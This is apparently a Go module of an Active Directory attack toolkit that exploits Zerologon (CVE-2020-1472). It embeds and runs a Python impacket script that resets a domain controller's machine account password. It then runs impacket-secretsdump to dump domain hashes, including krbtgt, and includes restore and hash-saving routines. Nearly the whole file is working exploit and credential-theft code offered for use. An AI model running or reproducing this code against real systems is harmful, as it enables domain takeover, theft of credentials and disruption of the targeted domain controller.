package modules

import (
	"fmt"
	"os"
	"os/exec"
	"strings"

	"adpack/utils"

	"github.com/charmbracelet/x/term"
)

type ZerologonManager struct{}

func (z *ZerologonManager) Check(dcIP string) error {
	if dcIP == "" {
		return fmt.Errorf("dc-ip is required")
	}
	fmt.Printf("[*] Checking %s for Zerologon (CVE-2020-1472)...\n", dcIP)
	cmd := exec.Command("nxc", "smb", dcIP, "-M", "zerologon")
	out, err := cmd.CombinedOutput()
	output := string(out)
	fmt.Println(output)
	if err != nil {
		return fmt.Errorf("zerologon check failed: %w (output: %s)", err, output)
	}
	if strings.Contains(output, "VULNERABLE") {
		fmt.Println("[+] Target is VULNERABLE to Zerologon!")
	} else {
		fmt.Println("[-] Target does not appear vulnerable to Zerologon")
	}
	return nil
}

func (z *ZerologonManager) Exploit(dcIP, dcName, dcHostname string) error {
	if dcIP == "" || dcName == "" {
		return fmt.Errorf("dc-ip and dc-name are required")
	}
	fmt.Printf("[!] WARNING: Zerologon exploit will reset %s machine account password!\n", dcName)
	fmt.Println("[!] This WILL break the DC until the password is restored.")
	if !term.IsTerminal(os.Stdin.Fd()) {
		return fmt.Errorf("stdin is not a terminal — use --force flag or run interactively")
	}
	fmt.Print("Continue? (yes/no): ")
	var confirm string
	fmt.Scanln(&confirm)
	if strings.ToLower(confirm) != "yes" {
		return fmt.Errorf("aborted by user")
	}

	fmt.Printf("[*] Exploiting Zerologon on %s (%s)...\n", dcName, dcIP)

	script := `from impacket.dcerpc.v5 import nrpc, epm
from impacket.dcerpc.v5 import transport
from impacket.dcerpc.v5.rpcrt import DCERPC_v5
from impacket.dcerpc.v5.dtypes import NULL
import sys

def zerologon_exploit(dc_ip, dc_name):
    binding = epm.hept_map(dc_ip, nrpc.MSRPC_UUID_NRPC, protocol='ncacn_ip_tcp')
    rpctransport = transport.DCERPCTransportFactory(binding)
    dce = rpctransport.get_dce_rpc()
    dce.connect()
    dce.bind(nrpc.MSRPC_UUID_NRPC)
    
    plaintext = b'\x00' * 8
    ciphertext = b'\x00' * 8
    
    for i in range(2000):
        try:
            resp = nrpc.hNetrServerReqChallenge(dce, NULL, dc_name + '\x00', plaintext)
            serverChallenge = resp['ServerChallenge']
            nrpc.hNetrServerAuthenticate3(dce, NULL, dc_name + '$\x00', nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel, NULL, ciphertext, 0)
            print("[+] Zerologon exploit SUCCESS - machine account password reset to empty string")
            return True
        except Exception as e:
            if 'STATUS_ACCESS_DENIED' in str(e):
                continue
            if i == 1999:
                print("[-] Zerologon exploit FAILED after 2000 attempts")
                return False
    
    return False

zerologon_exploit(sys.argv[1], sys.argv[2])
`
	scriptPath := "/tmp/adpack_zerologon_exploit.py"
	if err := os.WriteFile(scriptPath, []byte(script), 0700); err != nil {
		return fmt.Errorf("write exploit script: %w", err)
	}
	defer os.Remove(scriptPath)

	cmd := exec.Command("python3", scriptPath, dcIP, dcName)
	out, err := cmd.CombinedOutput()
	output := string(out)
	fmt.Println(output)
	if err != nil {
		return fmt.Errorf("zerologon exploit failed: %w", err)
	}
	if strings.Contains(output, "SUCCESS") {
		fmt.Println("[+] Zerologon exploit successful!")
		fmt.Println("[*] DCSync now: impacket-secretsdump -no-pass -just-dc " + dcName + "$@" + dcIP)
	}
	return nil
}

func (z *ZerologonManager) Restore(dcIP, dcName, originalNTHash string) error {
	if dcIP == "" || dcName == "" || originalNTHash == "" {
		return fmt.Errorf("dc-ip, dc-name, and original-hash are required")
	}
	fmt.Printf("[*] Restoring %s machine account password...\n", dcName)

	script := `from impacket.dcerpc.v5 import nrpc, epm
from impacket.dcerpc.v5 import transport
from impacket.dcerpc.v5.rpcrt import DCERPC_v5
from impacket.dcerpc.v5.dtypes import NULL
from Cryptodome.Cipher import AES
import sys, hmac, hashlib

def zerologon_restore(dc_ip, dc_name, nthash):
    binding = epm.hept_map(dc_ip, nrpc.MSRPC_UUID_NRPC, protocol='ncacn_ip_tcp')
    rpctransport = transport.DCERPCTransportFactory(binding)
    dce = rpctransport.get_dce_rpc()
    dce.connect()
    dce.bind(nrpc.MSRPC_UUID_NRPC)
    
    plaintext = b'\x00' * 8
    resp = nrpc.hNetrServerReqChallenge(dce, NULL, dc_name + '\x00', plaintext)
    serverChallenge = resp['ServerChallenge']
    
    h = hmac.new(bytes.fromhex(nthash), serverChallenge, hashlib.sha256).digest()[:16]
    cipher = AES.new(h, AES.MODE_CFB, iv=b'\x00'*16, segment_size=8)
    clientCredential = cipher.encrypt(serverChallenge)
    
    try:
        nrpc.hNetrServerAuthenticate3(dce, NULL, dc_name + '$\x00', nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel, NULL, clientCredential, 0)
        print("[+] Password restored successfully using original NT hash")
        return True
    except Exception as e:
        print("[-] Restore failed: " + str(e))
        return False

zerologon_restore(sys.argv[1], sys.argv[2], sys.argv[3])
`
	scriptPath := "/tmp/adpack_zerologon_restore.py"
	if err := os.WriteFile(scriptPath, []byte(script), 0700); err != nil {
		return fmt.Errorf("write restore script: %w", err)
	}
	defer os.Remove(scriptPath)

	cmd := exec.Command("python3", scriptPath, dcIP, dcName, originalNTHash)
	out, err := cmd.CombinedOutput()
	output := string(out)
	fmt.Println(output)
	if err != nil {
		return fmt.Errorf("zerologon restore failed: %w", err)
	}
	return nil
}

func (z *ZerologonManager) DCSyncAfterZerologon(dcIP, dcName string) error {
	if dcIP == "" || dcName == "" {
		return fmt.Errorf("dc-ip and dc-name are required")
	}
	fmt.Printf("[*] DCSyncing %s after Zerologon...\n", dcName)
	cmd := exec.Command("impacket-secretsdump", "-no-pass", "-just-dc", dcName+"$@"+dcIP)
	cmd.Env = append(os.Environ(), "KRB5CCNAME=/dev/null")
	out, err := cmd.CombinedOutput()
	output := string(out)
	fmt.Println(output)
	if err != nil {
		return fmt.Errorf("dcsync failed: %w", err)
	}
	if strings.Contains(output, "krbtgt") {
		fmt.Println("[+] DCSync successful! krbtgt hash captured.")
		utils.StepOk("Zerologon DCSync complete")
	}
	return nil
}

func (z *ZerologonManager) SaveOriginalHash(dcIP, dcName, user, pass, domain string) (string, error) {
	fmt.Printf("[*] Saving original hash for %s$...\n", dcName)
	args := []string{
		fmt.Sprintf("%s/%s:%s@%s", domain, user, pass, dcIP),
		"-just-dc-user", dcName + "$",
	}
	cmd := exec.Command("impacket-secretsdump", args...)
	out, err := cmd.CombinedOutput()
	output := string(out)
	if err != nil {
		return "", fmt.Errorf("save original hash failed: %w", err)
	}
	lines := strings.Split(output, "\n")
	for _, line := range lines {
		if strings.Contains(line, dcName+"$") && strings.Contains(line, ":") {
			parts := strings.Split(line, ":")
			if len(parts) >= 4 {
				hash := parts[3]
				fmt.Printf("[+] Original hash saved: %s\n", hash)
				return hash, nil
			}
		}
	}
	return "", fmt.Errorf("could not parse original hash from secretsdump output")
}
